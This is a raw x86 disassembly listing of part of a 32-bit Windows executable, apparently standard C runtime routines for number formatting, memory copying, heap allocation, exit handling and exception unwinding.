00003755  E9F1FEFFFF        jmp 0x364b
0000375A  8B7D14            mov edi,[ebp+0x14]
0000375D  83FF15            cmp edi,byte +0x15
00003760  7E03              jng 0x3765
00003762  6A15              push byte +0x15
00003764  5F                pop edi
00003765  0FB775FA          movzx esi,word [ebp-0x6]
00003769  81EEFE3F0000      sub esi,0x3ffe
0000376F  668365FA00        and word [ebp-0x6],byte +0x0
00003774  C7451C08000000    mov dword [ebp+0x1c],0x8
0000377B  8D45F0            lea eax,[ebp-0x10]
0000377E  50                push eax
0000377F  E85DF8FFFF        call 0x2fe1
00003784  FF4D1C            dec dword [ebp+0x1c]
00003787  59                pop ecx
00003788  75F1              jnz 0x377b
0000378A  85F6              test esi,esi
0000378C  7D17              jnl 0x37a5
0000378E  F7DE              neg esi
00003790  81E6FF000000      and esi,0xff
00003796  7E0D              jng 0x37a5
00003798  8D45F0            lea eax,[ebp-0x10]
0000379B  50                push eax
0000379C  E86EF8FFFF        call 0x300f
000037A1  4E                dec esi
000037A2  59                pop ecx
000037A3  75F3              jnz 0x3798
000037A5  8D4F01            lea ecx,[edi+0x1]
000037A8  8D4304            lea eax,[ebx+0x4]
000037AB  85C9              test ecx,ecx
000037AD  89451C            mov [ebp+0x1c],eax
000037B0  7E50              jng 0x3802
000037B2  894D14            mov [ebp+0x14],ecx
000037B5  8D75F0            lea esi,[ebp-0x10]
000037B8  8D7D08            lea edi,[ebp+0x8]
000037BB  A5                movsd
000037BC  A5                movsd
000037BD  8D45F0            lea eax,[ebp-0x10]
000037C0  50                push eax
000037C1  A5                movsd
000037C2  E81AF8FFFF        call 0x2fe1
000037C7  8D45F0            lea eax,[ebp-0x10]
000037CA  50                push eax
000037CB  E811F8FFFF        call 0x2fe1
000037D0  8D4508            lea eax,[ebp+0x8]
000037D3  50                push eax
000037D4  8D45F0            lea eax,[ebp-0x10]
000037D7  50                push eax
000037D8  E8A6F7FFFF        call 0x2f83
000037DD  8D45F0            lea eax,[ebp-0x10]
000037E0  50                push eax
000037E1  E8FBF7FFFF        call 0x2fe1
000037E6  8A45FB            mov al,[ebp-0x5]
000037E9  8B4D1C            mov ecx,[ebp+0x1c]
000037EC  8065FB00          and byte [ebp-0x5],0x0
000037F0  83C414            add esp,byte +0x14
000037F3  0430              add al,0x30
000037F5  FF451C            inc dword [ebp+0x1c]
000037F8  FF4D14            dec dword [ebp+0x14]
000037FB  8801              mov [ecx],al
000037FD  75B6              jnz 0x37b5
000037FF  8B451C            mov eax,[ebp+0x1c]
00003802  8A48FF            mov cl,[eax-0x1]
00003805  48                dec eax
00003806  48                dec eax
00003807  80F935            cmp cl,0x35
0000380A  8D4B04            lea ecx,[ebx+0x4]
0000380D  7C30              jl 0x383f
0000380F  3BC1              cmp eax,ecx
00003811  720F              jc 0x3822
00003813  803839            cmp byte [eax],0x39
00003816  7506              jnz 0x381e
00003818  C60030            mov byte [eax],0x30
0000381B  48                dec eax
0000381C  EBF1              jmp short 0x380f
0000381E  3BC1              cmp eax,ecx
00003820  7304              jnc 0x3826
00003822  40                inc eax
00003823  66FF03            inc word [ebx]
00003826  FE00              inc byte [eax]
00003828  2AC3              sub al,bl
0000382A  2C03              sub al,0x3
0000382C  884303            mov [ebx+0x3],al
0000382F  0FBEC0            movsx eax,al
00003832  8064180400        and byte [eax+ebx+0x4],0x0
00003837  8B45FC            mov eax,[ebp-0x4]
0000383A  5F                pop edi
0000383B  5E                pop esi
0000383C  5B                pop ebx
0000383D  C9                leave
0000383E  C3                ret
0000383F  3BC1              cmp eax,ecx
00003841  720C              jc 0x384f
00003843  803830            cmp byte [eax],0x30
00003846  7503              jnz 0x384b
00003848  48                dec eax
00003849  EBF4              jmp short 0x383f
0000384B  3BC1              cmp eax,ecx
0000384D  73D9              jnc 0x3828
0000384F  66832300          and word [ebx],byte +0x0
00003853  C6430220          mov byte [ebx+0x2],0x20
00003857  C6430301          mov byte [ebx+0x3],0x1
0000385B  C60130            mov byte [ecx],0x30
0000385E  80630500          and byte [ebx+0x5],0x0
00003862  6A01              push byte +0x1
00003864  58                pop eax
00003865  EBD3              jmp short 0x383a
00003867  833DC86D1E0002    cmp dword [0x1e6dc8],byte +0x2
0000386E  7405              jz 0x3875
00003870  E8010C0000        call 0x4476
00003875  FF742404          push dword [esp+0x4]
00003879  E8310C0000        call 0x44af
0000387E  68FF000000        push dword 0xff
00003883  FF155C641E00      call near [0x1e645c]
00003889  59                pop ecx
0000388A  59                pop ecx
0000388B  C3                ret
0000388C  CC                int3
0000388D  CC                int3
0000388E  CC                int3
0000388F  CC                int3
00003890  55                push ebp
00003891  8BEC              mov ebp,esp
00003893  57                push edi
00003894  56                push esi
00003895  8B750C            mov esi,[ebp+0xc]
00003898  8B4D10            mov ecx,[ebp+0x10]
0000389B  8B7D08            mov edi,[ebp+0x8]
0000389E  8BC1              mov eax,ecx
000038A0  8BD1              mov edx,ecx
000038A2  03C6              add eax,esi
000038A4  3BFE              cmp edi,esi
000038A6  7608              jna 0x38b0
000038A8  3BF8              cmp edi,eax
000038AA  0F8278010000      jc near 0x3a28
000038B0  F7C703000000      test edi,0x3
000038B6  7514              jnz 0x38cc
000038B8  C1E902            shr ecx,0x2
000038BB  83E203            and edx,byte +0x3
000038BE  83F908            cmp ecx,byte +0x8
000038C1  7229              jc 0x38ec
000038C3  F3A5              rep movsd
000038C5  FF2495D8391E00    jmp near [edx*4+0x1e39d8]
000038CC  8BC7              mov eax,edi
000038CE  BA03000000        mov edx,0x3
000038D3  83E904            sub ecx,byte +0x4
000038D6  720C              jc 0x38e4
000038D8  83E003            and eax,byte +0x3
000038DB  03C8              add ecx,eax
000038DD  FF2485F0381E00    jmp near [eax*4+0x1e38f0]
000038E4  FF248DE8391E00    jmp near [ecx*4+0x1e39e8]
000038EB  90                nop
000038EC  FF248D6C391E00    jmp near [ecx*4+0x1e396c]
000038F3  90                nop
000038F4  0039              add [ecx],bh
000038F6  1E                push ds
000038F7  002C39            add [ecx+edi],ch
000038FA  1E                push ds
000038FB  005039            add [eax+0x39],dl
000038FE  1E                push ds
000038FF  0023              add [ebx],ah
00003901  D18A0688078A      ror dword [edx+0x8a078806],1
00003907  46                inc esi
00003908  018847018A46      add [eax+0x468a0147],ecx
0000390E  02C1              add al,cl
00003910  E902884702        jmp 0x247c117
00003915  83C603            add esi,byte +0x3
00003918  83C703            add edi,byte +0x3
0000391B  83F908            cmp ecx,byte +0x8
0000391E  72CC              jc 0x38ec
00003920  F3A5              rep movsd
00003922  FF2495D8391E00    jmp near [edx*4+0x1e39d8]
00003929  8D4900            lea ecx,[ecx+0x0]
0000392C  23D1              and edx,ecx
0000392E  8A06              mov al,[esi]
00003930  8807              mov [edi],al
00003932  8A4601            mov al,[esi+0x1]
00003935  C1E902            shr ecx,0x2
00003938  884701            mov [edi+0x1],al
0000393B  83C602            add esi,byte +0x2
0000393E  83C702            add edi,byte +0x2
00003941  83F908            cmp ecx,byte +0x8
00003944  72A6              jc 0x38ec
00003946  F3A5              rep movsd
00003948  FF2495D8391E00    jmp near [edx*4+0x1e39d8]
0000394F  90                nop
00003950  23D1              and edx,ecx
00003952  8A06              mov al,[esi]
00003954  8807              mov [edi],al
00003956  46                inc esi
00003957  C1E902            shr ecx,0x2
0000395A  47                inc edi
0000395B  83F908            cmp ecx,byte +0x8
0000395E  728C              jc 0x38ec
00003960  F3A5              rep movsd
00003962  FF2495D8391E00    jmp near [edx*4+0x1e39d8]
00003969  8D4900            lea ecx,[ecx+0x0]
0000396C  CF                iret
0000396D  391E              cmp [esi],ebx
0000396F  00BC391E00B439    add [ecx+edi+0x39b4001e],bh
00003976  1E                push ds
00003977  00AC391E00A439    add [ecx+edi+0x39a4001e],ch
0000397E  1E                push ds
0000397F  009C391E009439    add [ecx+edi+0x3994001e],bl
00003986  1E                push ds
00003987  008C391E008B44    add [ecx+edi+0x448b001e],cl
0000398E  8EE4              mov fs,sp
00003990  89448FE4          mov [edi+ecx*4-0x1c],eax
00003994  8B448EE8          mov eax,[esi+ecx*4-0x18]
00003998  89448FE8          mov [edi+ecx*4-0x18],eax
0000399C  8B448EEC          mov eax,[esi+ecx*4-0x14]
000039A0  89448FEC          mov [edi+ecx*4-0x14],eax
000039A4  8B448EF0          mov eax,[esi+ecx*4-0x10]
000039A8  89448FF0          mov [edi+ecx*4-0x10],eax
000039AC  8B448EF4          mov eax,[esi+ecx*4-0xc]
000039B0  89448FF4          mov [edi+ecx*4-0xc],eax
000039B4  8B448EF8          mov eax,[esi+ecx*4-0x8]
000039B8  89448FF8          mov [edi+ecx*4-0x8],eax
000039BC  8B448EFC          mov eax,[esi+ecx*4-0x4]
000039C0  89448FFC          mov [edi+ecx*4-0x4],eax
000039C4  8D048D00000000    lea eax,[ecx*4+0x0]
000039CB  03F0              add esi,eax
000039CD  03F8              add edi,eax
000039CF  FF2495D8391E00    jmp near [edx*4+0x1e39d8]
000039D6  8BFF              mov edi,edi
000039D8  E8391E00F0        call 0xf0005816
000039DD  391E              cmp [esi],ebx
000039DF  00FC              add ah,bh
000039E1  391E              cmp [esi],ebx
000039E3  0010              add [eax],dl
000039E5  3A1E              cmp bl,[esi]
000039E7  008B45085E5F      add [ebx+0x5f5e0845],cl
000039ED  C9                leave
000039EE  C3                ret
000039EF  90                nop
000039F0  8A06              mov al,[esi]
000039F2  8807              mov [edi],al
000039F4  8B4508            mov eax,[ebp+0x8]
000039F7  5E                pop esi
000039F8  5F                pop edi
000039F9  C9                leave
000039FA  C3                ret
000039FB  90                nop
000039FC  8A06              mov al,[esi]
000039FE  8807              mov [edi],al
00003A00  8A4601            mov al,[esi+0x1]
00003A03  884701            mov [edi+0x1],al
00003A06  8B4508            mov eax,[ebp+0x8]
00003A09  5E                pop esi
00003A0A  5F                pop edi
00003A0B  C9                leave
00003A0C  C3                ret
00003A0D  8D4900            lea ecx,[ecx+0x0]
00003A10  8A06              mov al,[esi]
00003A12  8807              mov [edi],al
00003A14  8A4601            mov al,[esi+0x1]
00003A17  884701            mov [edi+0x1],al
00003A1A  8A4602            mov al,[esi+0x2]
00003A1D  884702            mov [edi+0x2],al
00003A20  8B4508            mov eax,[ebp+0x8]
00003A23  5E                pop esi
00003A24  5F                pop edi
00003A25  C9                leave
00003A26  C3                ret
00003A27  90                nop
00003A28  8D7431FC          lea esi,[ecx+esi-0x4]
00003A2C  8D7C39FC          lea edi,[ecx+edi-0x4]
00003A30  F7C703000000      test edi,0x3
00003A36  7524              jnz 0x3a5c
00003A38  C1E902            shr ecx,0x2
00003A3B  83E203            and edx,byte +0x3
00003A3E  83F908            cmp ecx,byte +0x8
00003A41  720D              jc 0x3a50
00003A43  FD                std
00003A44  F3A5              rep movsd
00003A46  FC                cld
00003A47  FF2495703B1E00    jmp near [edx*4+0x1e3b70]
00003A4E  8BFF              mov edi,edi
00003A50  F7D9              neg ecx
00003A52  FF248D203B1E00    jmp near [ecx*4+0x1e3b20]
00003A59  8D4900            lea ecx,[ecx+0x0]
00003A5C  8BC7              mov eax,edi
00003A5E  BA03000000        mov edx,0x3
00003A63  83F904            cmp ecx,byte +0x4
00003A66  720C              jc 0x3a74
00003A68  83E003            and eax,byte +0x3
00003A6B  2BC8              sub ecx,eax
00003A6D  FF2485783A1E00    jmp near [eax*4+0x1e3a78]
00003A74  FF248D703B1E00    jmp near [ecx*4+0x1e3b70]
00003A7B  90                nop
00003A7C  883A              mov [edx],bh
00003A7E  1E                push ds
00003A7F  00A83A1E00D0      add [eax+0xd0001e3a],ch
00003A85  3A1E              cmp bl,[esi]
00003A87  008A460323D1      add [edx+0xd1230346],cl
00003A8D  884703            mov [edi+0x3],al
00003A90  4E                dec esi
00003A91  C1E902            shr ecx,0x2
00003A94  4F                dec edi
00003A95  83F908            cmp ecx,byte +0x8
00003A98  72B6              jc 0x3a50
00003A9A  FD                std
00003A9B  F3A5              rep movsd
00003A9D  FC                cld
00003A9E  FF2495703B1E00    jmp near [edx*4+0x1e3b70]
00003AA5  8D4900            lea ecx,[ecx+0x0]
00003AA8  8A4603            mov al,[esi+0x3]
00003AAB  23D1              and edx,ecx
00003AAD  884703            mov [edi+0x3],al
00003AB0  8A4602            mov al,[esi+0x2]
00003AB3  C1E902            shr ecx,0x2
00003AB6  884702            mov [edi+0x2],al
00003AB9  83EE02            sub esi,byte +0x2
00003ABC  83EF02            sub edi,byte +0x2
00003ABF  83F908            cmp ecx,byte +0x8
00003AC2  728C              jc 0x3a50
00003AC4  FD                std
00003AC5  F3A5              rep movsd
00003AC7  FC                cld
00003AC8  FF2495703B1E00    jmp near [edx*4+0x1e3b70]
00003ACF  90                nop
00003AD0  8A4603            mov al,[esi+0x3]
00003AD3  23D1              and edx,ecx
00003AD5  884703            mov [edi+0x3],al
00003AD8  8A4602            mov al,[esi+0x2]
00003ADB  884702            mov [edi+0x2],al
00003ADE  8A4601            mov al,[esi+0x1]
00003AE1  C1E902            shr ecx,0x2
00003AE4  884701            mov [edi+0x1],al
00003AE7  83EE03            sub esi,byte +0x3
00003AEA  83EF03            sub edi,byte +0x3
00003AED  83F908            cmp ecx,byte +0x8
00003AF0  0F825AFFFFFF      jc near 0x3a50
00003AF6  FD                std
00003AF7  F3A5              rep movsd
00003AF9  FC                cld
00003AFA  FF2495703B1E00    jmp near [edx*4+0x1e3b70]
00003B01  8D4900            lea ecx,[ecx+0x0]
00003B04  243B              and al,0x3b
00003B06  1E                push ds
00003B07  002C3B            add [ebx+edi],ch
00003B0A  1E                push ds
00003B0B  00343B            add [ebx+edi],dh
00003B0E  1E                push ds
00003B0F  003C3B            add [ebx+edi],bh
00003B12  1E                push ds
00003B13  00443B1E          add [ebx+edi+0x1e],al
00003B17  004C3B1E          add [ebx+edi+0x1e],cl
00003B1B  00543B1E          add [ebx+edi+0x1e],dl
00003B1F  00673B            add [edi+0x3b],ah
00003B22  1E                push ds
00003B23  008B448E1C89      add [ebx+0x891c8e44],cl
00003B29  44                inc esp
00003B2A  8F                db 0x8F
00003B2B  1C8B              sbb al,0x8b
00003B2D  44                inc esp
00003B2E  8E18              mov ds,[eax]
00003B30  89448F18          mov [edi+ecx*4+0x18],eax
00003B34  8B448E14          mov eax,[esi+ecx*4+0x14]
00003B38  89448F14          mov [edi+ecx*4+0x14],eax
00003B3C  8B448E10          mov eax,[esi+ecx*4+0x10]
00003B40  89448F10          mov [edi+ecx*4+0x10],eax
00003B44  8B448E0C          mov eax,[esi+ecx*4+0xc]
00003B48  89448F0C          mov [edi+ecx*4+0xc],eax
00003B4C  8B448E08          mov eax,[esi+ecx*4+0x8]
00003B50  89448F08          mov [edi+ecx*4+0x8],eax
00003B54  8B448E04          mov eax,[esi+ecx*4+0x4]
00003B58  89448F04          mov [edi+ecx*4+0x4],eax
00003B5C  8D048D00000000    lea eax,[ecx*4+0x0]
00003B63  03F0              add esi,eax
00003B65  03F8              add edi,eax
00003B67  FF2495703B1E00    jmp near [edx*4+0x1e3b70]
00003B6E  8BFF              mov edi,edi
00003B70  803B1E            cmp byte [ebx],0x1e
00003B73  00883B1E0098      add [eax+0x98001e3b],cl
00003B79  3B1E              cmp ebx,[esi]
00003B7B  00AC3B1E008B45    add [ebx+edi+0x458b001e],ch
00003B82  085E5F            or [esi+0x5f],bl
00003B85  C9                leave
00003B86  C3                ret
00003B87  90                nop
00003B88  8A4603            mov al,[esi+0x3]
00003B8B  884703            mov [edi+0x3],al
00003B8E  8B4508            mov eax,[ebp+0x8]
00003B91  5E                pop esi
00003B92  5F                pop edi
00003B93  C9                leave
00003B94  C3                ret
00003B95  8D4900            lea ecx,[ecx+0x0]
00003B98  8A4603            mov al,[esi+0x3]
00003B9B  884703            mov [edi+0x3],al
00003B9E  8A4602            mov al,[esi+0x2]
00003BA1  884702            mov [edi+0x2],al
00003BA4  8B4508            mov eax,[ebp+0x8]
00003BA7  5E                pop esi
00003BA8  5F                pop edi
00003BA9  C9                leave
00003BAA  C3                ret
00003BAB  90                nop
00003BAC  8A4603            mov al,[esi+0x3]
00003BAF  884703            mov [edi+0x3],al
00003BB2  8A4602            mov al,[esi+0x2]
00003BB5  884702            mov [edi+0x2],al
00003BB8  8A4601            mov al,[esi+0x1]
00003BBB  884701            mov [edi+0x1],al
00003BBE  8B4508            mov eax,[ebp+0x8]
00003BC1  5E                pop esi
00003BC2  5F                pop edi
00003BC3  C9                leave
00003BC4  C3                ret
00003BC5  FF35806F1E00      push dword [0x1e6f80]
00003BCB  FF742408          push dword [esp+0x8]
00003BCF  E803000000        call 0x3bd7
00003BD4  59                pop ecx
00003BD5  59                pop ecx
00003BD6  C3                ret
00003BD7  837C2404E0        cmp dword [esp+0x4],byte -0x20
00003BDC  7722              ja 0x3c00
00003BDE  FF742404          push dword [esp+0x4]
00003BE2  E81C000000        call 0x3c03
00003BE7  85C0              test eax,eax
00003BE9  59                pop ecx
00003BEA  7516              jnz 0x3c02
00003BEC  39442408          cmp [esp+0x8],eax
00003BF0  7410              jz 0x3c02
00003BF2  FF742404          push dword [esp+0x4]
00003BF6  E8070A0000        call 0x4602
00003BFB  85C0              test eax,eax
00003BFD  59                pop ecx
00003BFE  75DE              jnz 0x3bde
00003C00  33C0              xor eax,eax
00003C02  C3                ret
00003C03  56                push esi
00003C04  8B742408          mov esi,[esp+0x8]
00003C08  3B3538671E00      cmp esi,[0x1e6738]
00003C0E  57                push edi
00003C0F  7721              ja 0x3c32
00003C11  6A09              push byte +0x9
00003C13  E885F0FFFF        call 0x2c9d
00003C18  56                push esi
00003C19  E8550D0000        call 0x4973
00003C1E  6A09              push byte +0x9
00003C20  8BF8              mov edi,eax
00003C22  E8D7F0FFFF        call 0x2cfe
00003C27  83C40C            add esp,byte +0xc
00003C2A  85FF              test edi,edi
00003C2C  7404              jz 0x3c32
00003C2E  8BC7              mov eax,edi
00003C30  EB1C              jmp short 0x3c4e
00003C32  85F6              test esi,esi
00003C34  7503              jnz 0x3c39
00003C36  6A01              push byte +0x1
00003C38  5E                pop esi
00003C39  83C60F            add esi,byte +0xf
00003C3C  83E6F0            and esi,byte -0x10
00003C3F  56                push esi
00003C40  6A00              push byte +0x0
00003C42  FF35C0721E00      push dword [0x1e72c0]
00003C48  FF15C8561E00      call near [0x1e56c8]
00003C4E  5F                pop edi
00003C4F  5E                pop esi
00003C50  C3                ret
00003C51  6A00              push byte +0x0
00003C53  6A01              push byte +0x1
00003C55  FF74240C          push dword [esp+0xc]
00003C59  E804000000        call 0x3c62
00003C5E  83C40C            add esp,byte +0xc
00003C61  C3                ret
00003C62  57                push edi
00003C63  E89F000000        call 0x3d07
00003C68  6A01              push byte +0x1
00003C6A  5F                pop edi
00003C6B  393D0C6E1E00      cmp [0x1e6e0c],edi
00003C71  7511              jnz 0x3c84
00003C73  FF742408          push dword [esp+0x8]
00003C77  FF15D0561E00      call near [0x1e56d0]
00003C7D  50                push eax
00003C7E  FF15CC561E00      call near [0x1e56cc]
00003C84  837C240C00        cmp dword [esp+0xc],byte +0x0
00003C89  53                push ebx
00003C8A  8B5C2414          mov ebx,[esp+0x14]
00003C8E  893D086E1E00      mov [0x1e6e08],edi
00003C94  881D046E1E00      mov [0x1e6e04],bl
00003C9A  753C              jnz 0x3cd8
00003C9C  A1CC721E00        mov eax,[0x1e72cc]
00003CA1  85C0              test eax,eax
00003CA3  7422              jz 0x3cc7
00003CA5  8B0DC8721E00      mov ecx,[0x1e72c8]
00003CAB  56                push esi
00003CAC  8D71FC            lea esi,[ecx-0x4]
00003CAF  3BF0              cmp esi,eax
00003CB1  7213              jc 0x3cc6
00003CB3  8B06              mov eax,[esi]
00003CB5  85C0              test eax,eax
00003CB7  7402              jz 0x3cbb
00003CB9  FFD0              call eax
00003CBB  83EE04            sub esi,byte +0x4
00003CBE  3B35CC721E00      cmp esi,[0x1e72cc]
00003CC4  73ED              jnc 0x3cb3
00003CC6  5E                pop esi
00003CC7  68285F1E00        push dword 0x1e5f28
00003CCC  68245F1E00        push dword 0x1e5f24
00003CD1  E843000000        call 0x3d19
00003CD6  59                pop ecx
00003CD7  59                pop ecx
00003CD8  68305F1E00        push dword 0x1e5f30
00003CDD  682C5F1E00        push dword 0x1e5f2c
00003CE2  E832000000        call 0x3d19
00003CE7  59                pop ecx
00003CE8  59                pop ecx
00003CE9  85DB              test ebx,ebx
00003CEB  5B                pop ebx
00003CEC  7407              jz 0x3cf5
00003CEE  E81D000000        call 0x3d10
00003CF3  5F                pop edi
00003CF4  C3                ret
00003CF5  FF742408          push dword [esp+0x8]
00003CF9  893D0C6E1E00      mov [0x1e6e0c],edi
00003CFF  FF15B8561E00      call near [0x1e56b8]
00003D05  5F                pop edi
00003D06  C3                ret
00003D07  6A0D              push byte +0xd
00003D09  E88FEFFFFF        call 0x2c9d
00003D0E  59                pop ecx
00003D0F  C3                ret
00003D10  6A0D              push byte +0xd
00003D12  E8E7EFFFFF        call 0x2cfe
00003D17  59                pop ecx
00003D18  C3                ret
00003D19  56                push esi
00003D1A  8B742408          mov esi,[esp+0x8]
00003D1E  3B74240C          cmp esi,[esp+0xc]
00003D22  730D              jnc 0x3d31
00003D24  8B06              mov eax,[esi]
00003D26  85C0              test eax,eax
00003D28  7402              jz 0x3d2c
00003D2A  FFD0              call eax
00003D2C  83C604            add esi,byte +0x4
00003D2F  EBED              jmp short 0x3d1e
00003D31  5E                pop esi
00003D32  C3                ret
00003D33  CC                int3
00003D34  55                push ebp
00003D35  8BEC              mov ebp,esp
00003D37  53                push ebx
00003D38  56                push esi
00003D39  57                push edi
00003D3A  55                push ebp
00003D3B  6A00              push byte +0x0
00003D3D  6A00              push byte +0x0
00003D3F  684C3D1E00        push dword 0x1e3d4c
00003D44  FF7508            push dword [ebp+0x8]
00003D47  E830190000        call 0x567c
00003D4C  5D                pop ebp
00003D4D  5F                pop edi
00003D4E  5E                pop esi
00003D4F  5B                pop ebx
00003D50  8BE5              mov esp,ebp
00003D52  5D                pop ebp
00003D53  C3                ret
00003D54  8B4C2404          mov ecx,[esp+0x4]
00003D58  F7410406000000    test dword [ecx+0x4],0x6
00003D5F  B801000000        mov eax,0x1
00003D64  740F              jz 0x3d75
00003D66  8B442408          mov eax,[esp+0x8]
00003D6A  8B542410          mov edx,[esp+0x10]
00003D6E  8902              mov [edx],eax
00003D70  B803000000        mov eax,0x3
00003D75  C3                ret
00003D76  53                push ebx
00003D77  56                push esi
00003D78  57                push edi
00003D79  8B442410          mov eax,[esp+0x10]
00003D7D  50                push eax
00003D7E  6AFE              push byte -0x2
00003D80  68543D1E00        push dword 0x1e3d54
00003D85  64FF3500000000    push dword [fs:0x0]
00003D8C  64892500000000    mov [fs:0x0],esp
00003D93  8B442420          mov eax,[esp+0x20]
00003D97  8B5808            mov ebx,[eax+0x8]
00003D9A  8B700C            mov esi,[eax+0xc]
00003D9D  83FEFF            cmp esi,byte -0x1
00003DA0  742E              jz 0x3dd0
00003DA2  3B742424          cmp esi,[esp+0x24]
00003DA6  7428              jz 0x3dd0
00003DA8  8D3476            lea esi,[esi+esi*2]
00003DAB  8B0CB3            mov ecx,[ebx+esi*4]
00003DAE  894C2408          mov [esp+0x8],ecx
00003DB2  89480C            mov [eax+0xc],ecx
00003DB5  837CB30400        cmp dword [ebx+esi*4+0x4],byte +0x0
00003DBA  7512              jnz 0x3dce
00003DBC  6801010000        push dword 0x101
00003DC1  8B44B308          mov eax,[ebx+esi*4+0x8]
00003DC5  E840000000        call 0x3e0a
00003DCA  FF54B308          call near [ebx+esi*4+0x8]
00003DCE  EBC3              jmp short 0x3d93
00003DD0  648F0500000000    pop dword [fs:0x0]
00003DD7  83C40C            add esp,byte +0xc
00003DDA  5F                pop edi
00003DDB  5E                pop esi
00003DDC  5B                pop ebx
00003DDD  C3                ret
00003DDE  33C0              xor eax,eax
00003DE0  648B0D00000000    mov ecx,[fs:0x0]
00003DE7  817904543D1E00    cmp dword [ecx+0x4],0x1e3d54
00003DEE  7510              jnz 0x3e00
00003DF0  8B510C            mov edx,[ecx+0xc]
00003DF3  8B520C            mov edx,[edx+0xc]
00003DF6  395108            cmp [ecx+0x8],edx
00003DF9  7505              jnz 0x3e00
00003DFB  B801000000        mov eax,0x1
00003E00  C3                ret
00003E01  53                push ebx
00003E02  51                push ecx
00003E03  BB64661E00        mov ebx,0x1e6664
00003E08  EB0A              jmp short 0x3e14
00003E0A  53                push ebx
00003E0B  51                push ecx
00003E0C  BB64661E00        mov ebx,0x1e6664
00003E11  8B4D08            mov ecx,[ebp+0x8]
00003E14  894B08            mov [ebx+0x8],ecx
00003E17  894304            mov [ebx+0x4],eax
00003E1A  896B0C            mov [ebx+0xc],ebp
00003E1D  59                pop ecx
00003E1E  5B                pop ebx
00003E1F  C20400            ret 0x4
00003E22  CC                int3
00003E23  CC                int3
00003E24  56                push esi
00003E25  43                inc ebx
00003E26  3230              xor dh,[eax]
00003E28  58                pop eax
00003E29  43                inc ebx
00003E2A  3030              xor [eax],dh
00003E2C  55                push ebp
00003E2D  8BEC              mov ebp,esp
00003E2F  83EC08            sub esp,byte +0x8
00003E32  53                push ebx
00003E33  56                push esi
00003E34  57                push edi
00003E35  55                push ebp
00003E36  FC                cld
00003E37  8B5D0C            mov ebx,[ebp+0xc]
00003E3A  8B4508            mov eax,[ebp+0x8]
00003E3D  F7400406000000    test dword [eax+0x4],0x6
00003E44  0F8582000000      jnz near 0x3ecc
00003E4A  8945F8            mov [ebp-0x8],eax
00003E4D  8B4510            mov eax,[ebp+0x10]
00003E50  8945FC            mov [ebp-0x4],eax
00003E53  8D45F8            lea eax,[ebp-0x8]
00003E56  8943FC            mov [ebx-0x4],eax
00003E59  8B730C            mov esi,[ebx+0xc]
00003E5C  8B7B08            mov edi,[ebx+0x8]
00003E5F  83FEFF            cmp esi,byte -0x1
00003E62  7461              jz 0x3ec5
00003E64  8D0C76            lea ecx,[esi+esi*2]
00003E67  837C8F0400        cmp dword [edi+ecx*4+0x4],byte +0x0
00003E6C  7445              jz 0x3eb3
00003E6E  56                push esi
00003E6F  55                push ebp
00003E70  8D6B10            lea ebp,[ebx+0x10]
00003E73  FF548F04          call near [edi+ecx*4+0x4]
00003E77  5D                pop ebp
00003E78  5E                pop esi
00003E79  8B5D0C            mov ebx,[ebp+0xc]
00003E7C  0BC0              or eax,eax
00003E7E  7433              jz 0x3eb3
00003E80  783C              js 0x3ebe
00003E82  8B7B08            mov edi,[ebx+0x8]
00003E85  53                push ebx
00003E86  E8A9FEFFFF        call 0x3d34
00003E8B  83C404            add esp,byte +0x4
00003E8E  8D6B10            lea ebp,[ebx+0x10]
00003E91  56                push esi
00003E92  53                push ebx
00003E93  E8DEFEFFFF        call 0x3d76
00003E98  83C408            add esp,byte +0x8
00003E9B  8D0C76            lea ecx,[esi+esi*2]
00003E9E  6A01              push byte +0x1
00003EA0  8B448F08          mov eax,[edi+ecx*4+0x8]
00003EA4  E861FFFFFF        call 0x3e0a
00003EA9  8B048F            mov eax,[edi+ecx*4]
00003EAC  89430C            mov [ebx+0xc],eax
00003EAF  FF548F08          call near [edi+ecx*4+0x8]
00003EB3  8B7B08            mov edi,[ebx+0x8]
00003EB6  8D0C76            lea ecx,[esi+esi*2]
00003EB9  8B348F            mov esi,[edi+ecx*4]
00003EBC  EBA1              jmp short 0x3e5f
00003EBE  B800000000        mov eax,0x0
00003EC3  EB1C              jmp short 0x3ee1
00003EC5  B801000000        mov eax,0x1
00003ECA  EB15              jmp short 0x3ee1
00003ECC  55                push ebp
00003ECD  8D6B10            lea ebp,[ebx+0x10]
00003ED0  6AFF              push byte -0x1
00003ED2  53                push ebx
00003ED3  E89EFEFFFF        call 0x3d76
00003ED8  83C408            add esp,byte +0x8
00003EDB  5D                pop ebp
00003EDC  B801000000        mov eax,0x1
00003EE1  5D                pop ebp
00003EE2  5F                pop edi
00003EE3  5E                pop esi
00003EE4  5B                pop ebx
00003EE5  8BE5              mov esp,ebp
00003EE7  5D                pop ebp
00003EE8  C3                ret
00003EE9  55                push ebp
00003EEA  8B4C2408          mov ecx,[esp+0x8]
00003EEE  8B29              mov ebp,[ecx]
00003EF0  8B411C            mov eax,[ecx+0x1c]
00003EF3  50                push eax
00003EF4  8B4118            mov eax,[ecx+0x18]
00003EF7  50                push eax
00003EF8  E879FEFFFF        call 0x3d76
00003EFD  83C408            add esp,byte +0x8
00003F00  5D                pop ebp
00003F01  C20400            ret 0x4
00003F04  CC                int3
00003F05  CC                int3
00003F06  CC                int3
00003F07  CC                int3
00003F08  CC                int3
00003F09  CC                int3
00003F0A  CC                int3
00003F0B  CC                int3
00003F0C  CC                int3
00003F0D  CC                int3
00003F0E  CC                int3
00003F0F  CC                int3
00003F10  51                push ecx
00003F11  3D00100000        cmp eax,0x1000
00003F16  8D4C2408          lea ecx,[esp+0x8]
00003F1A  7214              jc 0x3f30
00003F1C  81E900100000      sub ecx,0x1000
00003F22  2D00100000        sub eax,0x1000
00003F27  8501              test [ecx],eax
00003F29  3D00100000        cmp eax,0x1000
00003F2E  73EC              jnc 0x3f1c
00003F30  2BC8              sub ecx,eax
00003F32  8BC4              mov eax,esp
00003F34  8501              test [ecx],eax
00003F36  8BE1              mov esp,ecx
00003F38  8B08              mov ecx,[eax]
00003F3A  8B4004            mov eax,[eax+0x4]
00003F3D  50                push eax
00003F3E  C3                ret
00003F3F  56                push esi
00003F40  8B742408          mov esi,[esp+0x8]
00003F44  85F6              test esi,esi
00003F46  743D              jz 0x3f85
00003F48  6A09              push byte +0x9
00003F4A  E84EEDFFFF        call 0x2c9d
00003F4F  56                push esi
00003F50  E8C8060000        call 0x461d
00003F55  59                pop ecx
00003F56  85C0              test eax,eax
00003F58  59                pop ecx
00003F59  7413              jz 0x3f6e
00003F5B  56                push esi
00003F5C  50                push eax
00003F5D  E8E6060000        call 0x4648
